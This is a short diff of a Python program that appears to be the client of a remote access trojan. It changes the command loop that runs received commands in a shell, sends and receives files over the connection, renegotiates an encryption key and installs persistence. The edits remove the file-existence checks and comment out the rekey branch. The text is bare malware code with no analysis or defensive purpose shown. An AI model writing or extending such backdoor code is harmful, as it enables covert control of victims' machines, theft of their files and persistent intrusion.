@@ -43,7 +43,7 @@ def main():
             conn.close()
             sys.exit(0)
 
-        # run command
+        # run a command
         elif cmd == 'execute':
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -54,8 +54,6 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                if not os.path.isfile(fname):
-                    continue
                 client.sendfile(fname)
                 continue
 
@@ -63,14 +61,12 @@ def main():
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                if os.path.isfile(fname):
-                    continue
                 client.recvfile(fname)
                 continue
 
         # regenerate DH key
-        elif cmd == 'rekey':
-            client.dh_key = crypto.diffiehellman(client.conn)
+        # elif cmd == 'rekey':
+        #    client.dh_key = crypto.diffiehellman(client.conn)
 
         elif cmd == 'persistence':
             results = persistence.run(plat)
